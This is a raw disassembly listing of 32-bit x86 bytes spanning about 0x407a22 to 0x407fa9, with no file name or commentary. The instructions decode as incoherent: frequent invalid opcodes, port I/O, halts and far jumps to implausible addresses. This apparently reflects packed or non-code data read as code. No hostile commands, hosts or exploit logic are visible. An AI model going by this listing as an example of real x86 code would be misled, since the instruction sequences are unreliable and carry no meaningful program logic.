  407a22:	4d                   	dec    %ebp
  407a23:	55                   	push   %ebp
  407a24:	d4 d3                	aam    $0xd3
  407a26:	e7 ea                	out    %eax,$0xea
  407a28:	dd ad 15 34 0e f4    	(bad) -0xbf1cbeb(%ebp)
  407a2e:	f2 d7                	repnz xlat %ds:(%ebx)
  407a30:	14 d2                	adc    $0xd2,%al
  407a32:	fb                   	sti
  407a33:	3d 9b 3d 7c dd       	cmp    $0xdd7c3d9b,%eax
  407a38:	d4 4a                	aam    $0x4a
  407a3a:	f9                   	stc
  407a3b:	8a a5 be 23 43 93    	mov    -0x6cbcdc42(%ebp),%ah
  407a41:	6b 87 1b ea b0 ce 0e 	imul   $0xe,-0x314f15e5(%edi),%eax
  407a48:	75 68                	jne    0x407ab2
  407a4a:	9b                   	fwait
  407a4b:	bd fd ae 6e be       	mov    $0xbe6eaefd,%ebp
  407a50:	57                   	push   %edi
  407a51:	83 1e 4f             	sbbl   $0x4f,(%esi)
  407a54:	af                   	scas   %es:(%edi),%eax
  407a55:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407a56:	67 a0 67 23          	addr16 mov 0x2367,%al
  407a5a:	76 18                	jbe    0x407a74
  407a5c:	de a0 4d f8 9c 25    	fisubs 0x259cf84d(%eax)
  407a62:	d5 b5                	aad    $0xb5
  407a64:	6b 0a b5             	imul   $0xffffffb5,(%edx),%ecx
  407a67:	29 f8                	sub    %edi,%eax
  407a69:	a2 fa 83 02 b9       	mov    %al,0xb90283fa
  407a6e:	00 72 db             	add    %dh,-0x25(%edx)
  407a71:	af                   	scas   %es:(%edi),%eax
  407a72:	b3 9b                	mov    $0x9b,%bl
  407a74:	f0 85 1a             	lock test %ebx,(%edx)
  407a77:	17                   	pop    %ss
  407a78:	f3 13 68 ee          	repz adc -0x12(%eax),%ebp
  407a7c:	07                   	pop    %es
  407a7d:	6d                   	insl   (%dx),%es:(%edi)
  407a7e:	ed                   	in     (%dx),%eax
  407a7f:	d6                   	salc
  407a80:	e4 3b                	in     $0x3b,%al
  407a82:	42                   	inc    %edx
  407a83:	f0 f4                	lock hlt
  407a85:	6c                   	insb   (%dx),%es:(%edi)
  407a86:	c1 55 12 d7          	rcll   $0xd7,0x12(%ebp)
  407a8a:	58                   	pop    %eax
  407a8b:	6c                   	insb   (%dx),%es:(%edi)
  407a8c:	50                   	push   %eax
  407a8d:	ce                   	into
  407a8e:	ed                   	in     (%dx),%eax
  407a8f:	72 9f                	jb     0x407a30
  407a91:	6b 27 ba             	imul   $0xffffffba,(%edi),%esp
  407a94:	79 7c                	jns    0x407b12
  407a96:	b5 d5                	mov    $0xd5,%ch
  407a98:	c9                   	leave
  407a99:	22 df                	and    %bh,%bl
  407a9b:	3c 31                	cmp    $0x31,%al
  407a9d:	62 bc a4 d2 e7 ed 69 	bound  %edi,0x69ede7d2(%esp,%eiz,4)
  407aa4:	ed                   	in     (%dx),%eax
  407aa5:	e9 56 ff 11 69       	jmp    0x69527a00
  407aaa:	68 f6 ea 6d 61       	push   $0x616deaf6
  407aaf:	34 0d                	xor    $0xd,%al
  407ab1:	6c                   	insb   (%dx),%es:(%edi)
  407ab2:	f6 ab 16 2d de 22    	imulb  0x22de2d16(%ebx)
  407ab8:	85 c9                	test   %ecx,%ecx
  407aba:	57                   	push   %edi
  407abb:	a3 b1 c3 8e ab       	mov    %eax,0xab8ec3b1
  407ac0:	72 f9                	jb     0x407abb
  407ac2:	b7 e2                	mov    $0xe2,%bh
  407ac4:	04 f7                	add    $0xf7,%al
  407ac6:	35 7b c9 c2 d7       	xor    $0xd7c2c97b,%eax
  407acb:	73 3a                	jae    0x407b07
  407acd:	36 6f                	outsl  %ss:(%esi),(%dx)
  407acf:	f5                   	cmc
  407ad0:	b9 dd 5d 1e 6e       	mov    $0x6e1e5ddd,%ecx
  407ad5:	ed                   	in     (%dx),%eax
  407ad6:	f4                   	hlt
  407ad7:	d2 71 4d             	shlb   %cl,0x4d(%ecx)
  407ada:	b7 77                	mov    $0x77,%bh
  407adc:	27                   	daa
  407add:	19 6b f9             	sbb    %ebp,-0x7(%ebx)
  407ae0:	0e                   	push   %cs
  407ae1:	4d                   	dec    %ebp
  407ae2:	ae                   	scas   %es:(%edi),%al
  407ae3:	7f 64                	jg     0x407b49
  407ae5:	fb                   	sti
  407ae6:	75 b6                	jne    0x407a9e
  407ae8:	5c                   	pop    %esp
  407ae9:	d3 82 05 41 47 dc    	roll   %cl,-0x23b8befb(%edx)
  407aef:	65 be fe 81 be 09    	gs mov $0x9be81fe,%esi
  407af5:	35 fd 13 aa fa       	xor    $0xfaaa13fd,%eax
  407afa:	83 65 62 77          	andl   $0x77,0x62(%ebp)
  407afe:	2b 17                	sub    (%edi),%edx
  407b00:	9d                   	popf
  407b01:	a0 de 27 c5 3e       	mov    0x3ec527de,%al
  407b06:	a9 d0 c6 96 24       	test   $0x2496c6d0,%eax
  407b0b:	d5 ea                	aad    $0xea
  407b0d:	f3 bb fa 3c d0 b4    	repz mov $0xb4d03cfa,%ebx
  407b13:	dd d3                	fst    %st(3)
  407b15:	b7 0d                	mov    $0xd,%bh
  407b17:	17                   	pop    %ss
  407b18:	12 c0                	adc    %al,%al
  407b1a:	bb a7 d7 cf 77       	mov    $0x77cfd7a7,%ebx
  407b1f:	48                   	dec    %eax
  407b20:	95                   	xchg   %eax,%ebp
  407b21:	9e                   	sahf
  407b22:	5e                   	pop    %esi
  407b23:	57                   	push   %edi
  407b24:	37                   	aaa
  407b25:	e6 81                	out    %al,$0x81
  407b27:	9a e8 8c 26 37 ee 90 	lcall  $0x90ee,$0x37268ce8
  407b2e:	70 1e                	jo     0x407b4e
  407b30:	e5 e1                	in     $0xe1,%eax
  407b32:	f3 ad                	rep lods %ds:(%esi),%eax
  407b34:	b7 c3                	mov    $0xc3,%bh
  407b36:	d3 e7                	shl    %cl,%edi
  407b38:	ea 96 4f 0b 4d 90 9f 	ljmp   $0x9f90,$0x4d0b4f96
  407b3f:	32 40 b7             	xor    -0x49(%eax),%al
  407b42:	7b 07                	jnp    0x407b4b
  407b44:	72 3b                	jb     0x407b81
  407b46:	2e 70 ee             	jo,pn  0x407b37
  407b49:	ee                   	out    %al,(%dx)
  407b4a:	a2 c2 bc ce ee       	mov    %al,0xeecebcc2
  407b4f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b50:	ed                   	in     (%dx),%eax
  407b51:	23 17                	and    (%edi),%edx
  407b53:	f2 06                	repnz push %es
  407b55:	7c dd                	jl     0x407b34
  407b57:	34 44                	xor    $0x44,%al
  407b59:	38 14 6e             	cmp    %dl,(%esi,%ebp,2)
  407b5c:	57                   	push   %edi
  407b5d:	0f d4 e2             	paddq  %mm2,%mm4
  407b60:	86 c7                	xchg   %al,%bh
  407b62:	b7 5b                	mov    $0x5b,%bh
  407b64:	38 f4                	cmp    %dh,%ah
  407b66:	41                   	inc    %ecx
  407b67:	0a 5e 12             	or     0x12(%esi),%bl
  407b6a:	ea fb f8 92 c1 e7 13 	ljmp   $0x13e7,$0xc192f8fb
  407b71:	85 80 91 f4 f4 b8    	test   %eax,-0x470b0b6f(%eax)
  407b77:	71 c4                	jno    0x407b3d
  407b79:	3a 1c 72             	cmp    (%edx,%esi,2),%bl
  407b7c:	1f                   	pop    %ds
  407b7d:	8e b7 c0 64 8d 8f    	mov    -0x70729b40(%edi),%?
  407b83:	8a e6                	mov    %dh,%ah
  407b85:	f1                   	int1
  407b86:	d6                   	salc
  407b87:	82 fb 76             	cmp    $0x76,%bl
  407b8a:	ca 5c f3             	lret   $0xf35c
  407b8d:	aa                   	stos   %al,%es:(%edi)
  407b8e:	cb                   	lret
  407b8f:	7c bb                	jl     0x407b4c
  407b91:	fb                   	sti
  407b92:	fa                   	cli
  407b93:	bd c1 ac e9 a9       	mov    $0xa9e9acc1,%ebp
  407b98:	0c 55                	or     $0x55,%al
  407b9a:	d8 35 b8 5c c1 56    	fdivs  0x56c15cb8
  407ba0:	37                   	aaa
  407ba1:	2e 25 be 1a b4 a8    	cs and $0xa8b41abe,%eax
  407ba7:	2f                   	das
  407ba8:	69 83 af f6 a6 6a ea 	imul   $0xc1bb3fea,0x6aa6f6af(%ebx),%eax
  407baf:	3f bb c1 
  407bb2:	ed                   	in     (%dx),%eax
  407bb3:	fd                   	std
  407bb4:	84 4f 6f             	test   %cl,0x6f(%edi)
  407bb7:	b8 5f e7 75 6f       	mov    $0x6f75e75f,%eax
  407bbc:	77 7b                	ja     0x407c39
  407bbe:	d5 7a                	aad    $0x7a
  407bc0:	65 ea ee 52 9d de e2 	gs ljmp $0x99e2,$0xde9d52ee
  407bc7:	99 
  407bc8:	24 66                	and    $0x66,%al
  407bca:	2b df                	sub    %edi,%ebx
  407bcc:	c0 74 7b 3a 68       	shlb   $0x68,0x3a(%ebx,%edi,2)
  407bd1:	41                   	inc    %ecx
  407bd2:	a0 92 29 de 0a       	mov    0xade2992,%al
  407bd7:	a8 ed                	test   $0xed,%al
  407bd9:	a9 74 31 38 6b       	test   $0x6b383174,%eax
  407bde:	bb bd 9b f9 4d       	mov    $0x4df99bbd,%ebx
  407be3:	34 41                	xor    $0x41,%al
  407be5:	94                   	xchg   %eax,%esp
  407be6:	77 85                	ja     0x407b6d
  407be8:	bc db 26 16 ba       	mov    $0xba1626db,%esp
  407bed:	bb c4 27 5c a0       	mov    $0xa05c27c4,%ebx
  407bf2:	7e 26                	jle    0x407c1a
  407bf4:	d4 83                	aam    $0x83
  407bf6:	e1 d5                	loope  0x407bcd
  407bf8:	6f                   	outsl  %ds:(%esi),(%dx)
  407bf9:	e6 7b                	out    %al,$0x7b
  407bfb:	25 ed c3 2f 5c       	and    $0x5c2fc3ed,%eax
  407c00:	05 fc 1d f5 b4       	add    $0xb4f51dfc,%eax
  407c05:	92                   	xchg   %eax,%edx
  407c06:	41                   	inc    %ecx
  407c07:	9f                   	lahf
  407c08:	77 a7                	ja     0x407bb1
  407c0a:	db 27                	(bad) (%edi)
  407c0c:	6c                   	insb   (%dx),%es:(%edi)
  407c0d:	87 6f cb             	xchg   %ebp,-0x35(%edi)
  407c10:	00 af 5f b1 ab c3    	add    %ch,-0x3c544ea1(%edi)
  407c16:	ad                   	lods   %ds:(%esi),%eax
  407c17:	2a 78 a3             	sub    -0x5d(%eax),%bh
  407c1a:	f2 ae                	repnz scas %es:(%edi),%al
  407c1c:	94                   	xchg   %eax,%esp
  407c1d:	29 f0                	sub    %esi,%eax
  407c1f:	10 a1 1c 37 42 14    	adc    %ah,0x1442371c(%ecx)
  407c25:	2c a8                	sub    $0xa8,%al
  407c27:	69 93 29 ee 25 1f 39 	imul   $0xfaaabc39,0x1f25ee29(%ebx),%edx
  407c2e:	bc aa fa 
  407c31:	7a 43                	jp     0x407c76
  407c33:	09 0a                	or     %ecx,(%edx)
  407c35:	d3 47 bb             	roll   %cl,-0x45(%edi)
  407c38:	5f                   	pop    %edi
  407c39:	34 ba                	xor    $0xba,%al
  407c3b:	f9                   	stc
  407c3c:	56                   	push   %esi
  407c3d:	17                   	pop    %ss
  407c3e:	8f                   	(bad)
  407c3f:	b8 8d ee 71 f5       	mov    $0xf571ee8d,%eax
  407c44:	c9                   	leave
  407c45:	c8 6b 3c bd          	enter  $0x3c6b,$0xbd
  407c49:	c7 03 3d 5c da d5    	movl   $0xd5da5c3d,(%ebx)
  407c4f:	11 82 da f2 c5 ea    	adc    %eax,-0x153a0d26(%edx)
  407c55:	40                   	inc    %eax
  407c56:	62 a6 3b 3c 1d fc    	bound  %esp,-0x3e2c3c5(%esi)
  407c5c:	4e                   	dec    %esi
  407c5d:	de e1                	fsubp  %st,%st(1)
  407c5f:	e1 05                	loope  0x407c66
  407c61:	8d 4d 8e             	lea    -0x72(%ebp),%ecx
  407c64:	a9 0b d4 15 80       	test   $0x8015d40b,%eax
  407c69:	6f                   	outsl  %ds:(%esi),(%dx)
  407c6a:	73 b8                	jae    0x407c24
  407c6c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407c6d:	7e ec                	jle    0x407c5b
  407c6f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407c70:	7b 9b                	jnp    0x407c0d
  407c72:	12 1f                	adc    (%edi),%bl
  407c74:	7d e9                	jge    0x407c5f
  407c76:	95                   	xchg   %eax,%ebp
  407c77:	35 03 5d 5d fc       	xor    $0xfc5d5d03,%eax
  407c7c:	52                   	push   %edx
  407c7d:	3f                   	aas
  407c7e:	e8 ab 26 b7 cb       	call   0xcbf7a32e
  407c83:	d7                   	xlat   %ds:(%ebx)
  407c84:	81 db 42 c0 66 b1    	sbb    $0xb166c042,%ebx
  407c8a:	b7 bb                	mov    $0xbb,%bh
  407c8c:	3c a2                	cmp    $0xa2,%al
  407c8e:	b9 e0 db 97 7a       	mov    $0x7a97dbe0,%ecx
  407c93:	af                   	scas   %es:(%edi),%eax
  407c94:	05 bd 66 6f 4b       	add    $0x4b6f66bd,%eax
  407c99:	1f                   	pop    %ds
  407c9a:	3f                   	aas
  407c9b:	56                   	push   %esi
  407c9c:	57                   	push   %edi
  407c9d:	d2 10                	rclb   %cl,(%eax)
  407c9f:	f6 f3                	div    %bl
  407ca1:	96                   	xchg   %eax,%esi
  407ca2:	3d fc 77 51 9a       	cmp    $0x9a5177fc,%eax
  407ca7:	cf                   	iret
  407ca8:	63 75 fb             	arpl   %esi,-0x5(%ebp)
  407cab:	64 3f                	fs aas
  407cad:	e1 19                	loope  0x407cc8
  407caf:	35 bc e7 b5 35       	xor    $0x35b5e7bc,%eax
  407cb4:	d3 07                	roll   %cl,(%edi)
  407cb6:	f2 e3 36             	repnz jecxz 0x407cef
  407cb9:	ef                   	out    %eax,(%dx)
  407cba:	e4 78                	in     $0x78,%al
  407cbc:	c4 b6 12 b7 ed 7c    	les    0x7cedb712(%esi),%esi
  407cc2:	7d d2                	jge    0x407c96
  407cc4:	79 f4                	jns    0x407cba
  407cc6:	fb                   	sti
  407cc7:	34 24                	xor    $0x24,%al
  407cc9:	1d ca f0 3e eb       	sbb    $0xeb3ef0ca,%eax
  407cce:	e7 1f                	out    %eax,$0x1f
  407cd0:	cb                   	lret
  407cd1:	51                   	push   %ecx
  407cd2:	e7 48                	out    %eax,$0x48
  407cd4:	5f                   	pop    %edi
  407cd5:	8c a1 d7 a7 db 17    	mov    %fs,0x17dba7d7(%ecx)
  407cdb:	f8                   	clc
  407cdc:	75 3b                	jne    0x407d19
  407cde:	02 7f 70             	add    0x70(%edi),%bh
  407ce1:	5d                   	pop    %ebp
  407ce2:	f4                   	hlt
  407ce3:	b8 b6 f4 e2 f6       	mov    $0xf6e2f4b6,%eax
  407ce8:	df d3                	(bad)
  407cea:	e1 87                	loope  0x407c73
  407cec:	e0 db                	loopne 0x407cc9
  407cee:	c5 d4 9f             	(bad)
  407cf1:	8f                   	(bad)
  407cf2:	e6 95                	out    %al,$0x95
  407cf4:	bb 79 c7 fb 7f       	mov    $0x7ffbc779,%ebx
  407cf9:	38 27                	cmp    %ah,(%edi)
  407cfb:	ab                   	stos   %eax,%es:(%edi)
  407cfc:	7b 31                	jnp    0x407d2f
  407cfe:	37                   	aaa
  407cff:	6f                   	outsl  %ds:(%esi),(%dx)
  407d00:	9f                   	lahf
  407d01:	18 97 49 c5 72 d7    	sbb    %dl,-0x288d3ab7(%edi)
  407d07:	10 2c 57             	adc    %ch,(%edi,%edx,2)
  407d0a:	77 07                	ja     0x407d13
  407d0c:	38 66 7c             	cmp    %ah,0x7c(%esi)
  407d0f:	ff                   	ljmp   (bad)
  407d10:	ed                   	in     (%dx),%eax
  407d11:	87 e6                	xchg   %esp,%esi
  407d13:	5e                   	pop    %esi
  407d14:	37                   	aaa
  407d15:	ef                   	out    %eax,(%dx)
  407d16:	01 dd                	add    %ebx,%ebp
  407d18:	47                   	inc    %edi
  407d19:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407d1a:	e8 e8 ee 47 b7       	call   0xb7886c07
  407d1f:	5f                   	pop    %edi
  407d20:	7f 37                	jg     0x407d59
  407d22:	aa                   	stos   %al,%es:(%edi)
  407d23:	15 ab 30 62 f1       	adc    $0xf16230ab,%eax
  407d28:	aa                   	stos   %al,%es:(%edi)
  407d29:	89 42 63             	mov    %eax,0x63(%edx)
  407d2c:	57                   	push   %edi
  407d2d:	47                   	inc    %edi
  407d2e:	61                   	popa
  407d2f:	c9                   	leave
  407d30:	d2 92 72 37 9f a4    	rclb   %cl,-0x5b60c88e(%edx)
  407d36:	b4 87                	mov    $0x87,%ah
  407d38:	57                   	push   %edi
  407d39:	9f                   	lahf
  407d3a:	02 cd                	add    %ch,%cl
  407d3c:	5e                   	pop    %esi
  407d3d:	d5 c1                	aad    $0xc1
  407d3f:	13 54 03 bb          	adc    -0x45(%ebx,%eax,1),%edx
  407d43:	70 33                	jo     0x407d78
  407d45:	19 f4                	sbb    %esi,%esp
  407d47:	6c                   	insb   (%dx),%es:(%edi)
  407d48:	54                   	push   %esp
  407d49:	17                   	pop    %ss
  407d4a:	aa                   	stos   %al,%es:(%edi)
  407d4b:	ea de 75 1e bc e3 48 	ljmp   $0x48e3,$0xbc1e75de
  407d52:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407d53:	f7 27                	mull   (%edi)
  407d55:	dd ea                	fucomp %st(2)
  407d57:	d6                   	salc
  407d58:	d2 ef                	shr    %cl,%bh
  407d5a:	e9 0e e6 23 56       	jmp    0x5664636d
  407d5f:	c8 3c 3e ba          	enter  $0x3e3c,$0xba
  407d63:	98                   	cwtl
  407d64:	44                   	inc    %esp
  407d65:	af                   	scas   %es:(%edi),%eax
  407d66:	1f                   	pop    %ds
  407d67:	36 ba 3c fd e8 35    	ss mov $0x35e8fd3c,%edx
  407d6d:	e0 2b                	loopne 0x407d9a
  407d6f:	0b 6d 7c             	or     0x7c(%ebp),%ebp
  407d72:	7b d5                	jnp    0x407d49
  407d74:	31 f5                	xor    %esi,%ebp
  407d76:	6b 6b bc 78          	imul   $0x78,-0x44(%ebx),%ebp
  407d7a:	c9                   	leave
  407d7b:	d6                   	salc
  407d7c:	96                   	xchg   %eax,%esi
  407d7d:	79 29                	jns    0x407da8
  407d7f:	ec                   	in     (%dx),%al
  407d80:	ec                   	in     (%dx),%al
  407d81:	f1                   	int1
  407d82:	d0 2f                	shrb   $1,(%edi)
  407d84:	48                   	dec    %eax
  407d85:	c5 a7 bd f4 c6 2d    	lds    0x2dc6f4bd(%edi),%esp
  407d8b:	3e eb 55             	ds jmp 0x407de3
  407d8e:	6d                   	insl   (%dx),%es:(%edi)
  407d8f:	ba f3 d4 d7 4e       	mov    $0x4ed7d4f3,%edx
  407d94:	d1 2b                	shrl   $1,(%ebx)
  407d96:	3c 0d                	cmp    $0xd,%al
  407d98:	b1 f4                	mov    $0xf4,%cl
  407d9a:	48                   	dec    %eax
  407d9b:	45                   	inc    %ebp
  407d9c:	f4                   	hlt
  407d9d:	09 54 37 88          	or     %edx,-0x78(%edi,%esi,1)
  407da1:	ce                   	into
  407da2:	10 cf                	adc    %cl,%bh
  407da4:	5d                   	pop    %ebp
  407da5:	dd 7b 3a             	fnstsw 0x3a(%ebx)
  407da8:	35 3a 51 e1 75       	xor    $0x75e1513a,%eax
  407dad:	f4                   	hlt
  407dae:	2f                   	das
  407daf:	eb 54                	jmp    0x407e05
  407db1:	65 82 d0 ad          	gs adc $0xad,%al
  407db5:	77 e4                	ja     0x407d9b
  407db7:	0c 05                	or     $0x5,%al
  407db9:	ed                   	in     (%dx),%eax
  407dba:	a3 5f d9 25 75       	mov    %eax,0x7525d95f
  407dbf:	ee                   	out    %al,(%dx)
  407dc0:	fe                   	(bad)
  407dc1:	bc 26 2f ef 2d       	mov    $0x2def2f26,%esp
  407dc6:	94                   	xchg   %eax,%esp
  407dc7:	e4 0b                	in     $0xb,%al
  407dc9:	be 9a 52 d0 f3       	mov    $0xf3d0529a,%esi
  407dce:	4f                   	dec    %edi
  407dcf:	f0 6a 71             	lock push $0x71
  407dd2:	11 72 77             	adc    %esi,0x77(%edx)
  407dd5:	77 bb                	ja     0x407d92
  407dd7:	7a dd                	jp     0x407db6
  407dd9:	de 01                	fiadds (%ecx)
  407ddb:	b5 e6                	mov    $0xe6,%ch
  407ddd:	0f df fe             	pandn  %mm6,%mm7
  407de0:	d5 bd                	aad    $0xbd
  407de2:	ed                   	in     (%dx),%eax
  407de3:	0f 45 6a 53          	cmovne 0x53(%edx),%ebp
  407de7:	2b 17                	sub    (%edi),%edx
  407de9:	26 6e                	outsb  %es:(%esi),(%dx)
  407deb:	de 70 ad             	fidivs -0x53(%eax)
  407dee:	55                   	push   %ebp
  407def:	07                   	pop    %es
  407df0:	5b                   	pop    %ebx
  407df1:	bd e9 d4 0e 70       	mov    $0x700ed4e9,%ebp
  407df6:	ed                   	in     (%dx),%eax
  407df7:	d4 79                	aam    $0x79
  407df9:	ea 02 ab 0e 81 6a 6a 	ljmp   $0x6a6a,$0x810eab02
  407e00:	37                   	aaa
  407e01:	1a ce                	sbb    %dh,%cl
  407e03:	6b b7 7a b3 4d ba fb 	imul   $0xfffffffb,-0x45b24c86(%edi),%esi
  407e0a:	a0 dd ab 1e c5       	mov    0xc51eabdd,%al
  407e0f:	12 ca                	adc    %dl,%cl
  407e11:	bb 5f 97 37 54       	mov    $0x5437975f,%ebx
  407e16:	f4                   	hlt
  407e17:	f4                   	hlt
  407e18:	f5                   	cmc
  407e19:	ef                   	out    %eax,(%dx)
  407e1a:	d6                   	salc
  407e1b:	f6 48 ba 59          	testb  $0x59,-0x46(%eax)
  407e1f:	a3 5a 38 28 ea       	mov    %eax,0xea28385a
  407e24:	51                   	push   %ecx
  407e25:	ed                   	in     (%dx),%eax
  407e26:	fc                   	cld
  407e27:	32 ba ed 84 54 26    	xor    0x265484ed(%edx),%bh
  407e2d:	3f                   	aas
  407e2e:	a9 15 7e b9 77       	test   $0x77b97e15,%eax
  407e33:	67 2f                	addr16 das
  407e35:	ff                   	ljmp   (bad)
  407e36:	e8 b8 92 36 0d       	call   0xd7710f3
  407e3b:	e2 2c                	loop   0x407e69
  407e3d:	fe                   	(bad)
  407e3e:	3e a1 13 b4 b7 3f    	mov    %ds:0x3fb7b413,%eax
  407e44:	21 d0                	and    %edx,%eax
  407e46:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407e47:	42                   	inc    %edx
  407e48:	e7 af                	out    %eax,$0xaf
  407e4a:	d3 bf 5a 4c 71 6d    	sarl   %cl,0x6d714c5a(%edi)
  407e50:	f1                   	int1
  407e51:	12 20                	adc    (%eax),%ah
  407e53:	43                   	inc    %ebx
  407e54:	e8 c6 17 01 d9       	call   0xd941961f
  407e59:	92                   	xchg   %eax,%edx
  407e5a:	5c                   	pop    %esp
  407e5b:	8e 82 97 f2 ff 40    	mov    0x40fff297(%edx),%es
  407e61:	51                   	push   %ecx
  407e62:	db 96 c5 78 97 08    	fistl  0x89778c5(%esi)
  407e68:	13 5f 9c             	adc    -0x64(%edi),%ebx
  407e6b:	7b 71                	jnp    0x407ede
  407e6d:	2c ba                	sub    $0xba,%al
  407e6f:	bb 65 ce da e3       	mov    $0xe3dace65,%ebx
  407e74:	4c                   	dec    %esp
  407e75:	28 f2                	sub    %dh,%dl
  407e77:	a3 74 f9 e6 2e       	mov    %eax,0x2ee6f974
  407e7c:	64 f5                	fs cmc
  407e7e:	de ab d8 85 1b 11    	fisubrs 0x111b85d8(%ebx)
  407e84:	9d                   	popf
  407e85:	ca b3 51             	lret   $0x51b3
  407e88:	c7 c1 37 f1 f4 29    	mov    $0x29f4f137,%ecx
  407e8e:	c5 75 fc             	lds    -0x4(%ebp),%esi
  407e91:	b3 73                	mov    $0x73,%bl
  407e93:	a9 6d a4 20 fa       	test   $0xfa20a46d,%eax
  407e98:	82 be 9a f9 06 8f 7b 	cmpb   $0x7b,-0x70f90666(%esi)
  407e9f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407ea0:	76 9a                	jbe    0x407e3c
  407ea2:	57                   	push   %edi
  407ea3:	67 cb                	addr16 lret
  407ea5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407ea6:	4e                   	dec    %esi
  407ea7:	76 81                	jbe    0x407e2a
  407ea9:	98                   	cwtl
  407eaa:	a1 ba 08 82 45       	mov    0x458208ba,%eax
  407eaf:	ea a7 f7 e2 a2 c1 e6 	ljmp   $0xe6c1,$0xa2e2f7a7
  407eb6:	f9                   	stc
  407eb7:	87 f0                	xchg   %esi,%eax
  407eb9:	13 b5 09 73 5b 68    	adc    0x685b7309(%ebp),%esi
  407ebf:	b4 fa                	mov    $0xfa,%ah
  407ec1:	ea 3f 8d 52 d7 e0 09 	ljmp   $0x9e0,$0xd7528d3f
  407ec8:	8a fa                	mov    %dl,%bh
  407eca:	58                   	pop    %eax
  407ecb:	db e2                	fnclex
  407ecd:	73 f5                	jae    0x407ec4
  407ecf:	6d                   	insl   (%dx),%es:(%edi)
  407ed0:	dd 2d a4 2a f5 d3    	(bad) 0xd3f52aa4
  407ed6:	1a 5d 23             	sbb    0x23(%ebp),%bl
  407ed9:	ea 67 56 ea de 41 35 	ljmp   $0x3541,$0xdeea5667
  407ee0:	e9 97 87 b4 40       	jmp    0x40f5067c
  407ee5:	e8 17 0b f1 00       	call   0x1318a01
  407eea:	54                   	push   %esp
  407eeb:	6d                   	insl   (%dx),%es:(%edi)
  407eec:	bf ce 16 53 57       	mov    $0x575316ce,%edi
  407ef1:	9b                   	fwait
  407ef2:	e6 f8                	out    %al,$0xf8
  407ef4:	9c                   	pushf
  407ef5:	df e1                	(bad)
  407ef7:	f1                   	int1
  407ef8:	79 7b                	jns    0x407f75
  407efa:	c9                   	leave
  407efb:	c6                   	(bad)
  407efc:	29 d0                	sub    %edx,%eax
  407efe:	c7                   	(bad)
  407eff:	8f                   	(bad)
  407f00:	ba fd 8d 6e bd       	mov    $0xbd6e8dfd,%edx
  407f05:	21 79 d2             	and    %edi,-0x2e(%ecx)
  407f08:	67 5d                	addr16 pop %ebp
  407f0a:	d4 fc                	aam    $0xfc
  407f0c:	64 55                	fs push %ebp
  407f0e:	f7 e6                	mul    %esi
  407f10:	ed                   	in     (%dx),%eax
  407f11:	c5 47 df             	lds    -0x21(%edi),%eax
  407f14:	80 da 12             	sbb    $0x12,%dl
  407f17:	7f fe                	jg     0x407f17
  407f19:	36 7a bd             	ss jp  0x407ed9
  407f1c:	fd                   	std
  407f1d:	fc                   	cld
  407f1e:	39 2e                	cmp    %ebp,(%esi)
  407f20:	1e                   	push   %ds
  407f21:	56                   	push   %esi
  407f22:	68 d6 6a a6 43       	push   $0x43a66ad6
  407f27:	3c b2                	cmp    $0xb2,%al
  407f29:	b8 2a 4d 6d 35       	mov    $0x356d4d2a,%eax
  407f2e:	e3 1f                	jecxz  0x407f4f
  407f30:	92                   	xchg   %eax,%edx
  407f31:	e9 96 32 72 7d       	jmp    0x7db2b1cc
  407f36:	9a 19 5c d2 82 f5 34 	lcall  $0x34f5,$0x82d25c19
  407f3d:	af                   	scas   %es:(%edi),%eax
  407f3e:	3b 68 d1             	cmp    -0x2f(%eax),%ebp
  407f41:	43                   	inc    %ebx
  407f42:	45                   	inc    %ebp
  407f43:	56                   	push   %esi
  407f44:	20 a3 d3 2f 54 fd    	and    %ah,-0x2abd02d(%ebx)
  407f4a:	e7 6a                	out    %eax,$0x6a
  407f4c:	62 97 ad 57 68 a1    	bound  %edx,-0x5e97a853(%edi)
  407f52:	92                   	xchg   %eax,%edx
  407f53:	1f                   	pop    %ds
  407f54:	ae                   	scas   %es:(%edi),%al
  407f55:	a9 e3 a1 7d 9e       	test   $0x9e7da1e3,%eax
  407f5a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407f5b:	0e                   	push   %cs
  407f5c:	8a ce                	mov    %dh,%cl
  407f5e:	e7 4f                	out    %eax,$0x4f
  407f60:	27                   	daa
  407f61:	b5 92                	mov    $0x92,%ch
  407f63:	57                   	push   %edi
  407f64:	96                   	xchg   %eax,%esi
  407f65:	72 c3                	jb     0x407f2a
  407f67:	d3 8b bb 00 fa e8    	rorl   %cl,-0x1705ff45(%ebx)
  407f6d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407f6e:	ce                   	into
  407f6f:	bd 2b 38 20 cd       	mov    $0xcd20382b,%ebp
  407f74:	dc e6                	fsub   %st,%st(6)
  407f76:	95                   	xchg   %eax,%ebp
  407f77:	f9                   	stc
  407f78:	d1 2f                	shrl   $1,(%edi)
  407f7a:	8e f4                	mov    %esp,%?
  407f7c:	0b 3a                	or     (%edx),%edi
  407f7e:	f1                   	int1
  407f7f:	49                   	dec    %ecx
  407f80:	9b                   	fwait
  407f81:	fa                   	cli
  407f82:	1b 3a                	sbb    (%edx),%edi
  407f84:	e9 a8 1f 8d 49       	jmp    0x49cd9f31
  407f89:	59                   	pop    %ecx
  407f8a:	b5 d4                	mov    $0xd4,%ch
  407f8c:	e7 9c                	out    %eax,$0x9c
  407f8e:	c3                   	ret
  407f8f:	e7 73                	out    %eax,$0x73
  407f91:	ed                   	in     (%dx),%eax
  407f92:	86 f6                	xchg   %dh,%dh
  407f94:	cd 41                	int    $0x41
  407f96:	b3 d9                	mov    $0xd9,%bl
  407f98:	ab                   	stos   %eax,%es:(%edi)
  407f99:	1e                   	push   %ds
  407f9a:	79 45                	jns    0x407fe1
  407f9c:	bc 81 f9 eb 4e       	mov    $0x4eebf981,%esp
  407fa1:	c3                   	ret
  407fa2:	c0 66 dc 9e          	shlb   $0x9e,-0x24(%esi)
  407fa6:	4a                   	dec    %edx
  407fa7:	07                   	pop    %es
  407fa8:	1f                   	pop    %ds
  407fa9:	97                   	xchg   %eax,%edi
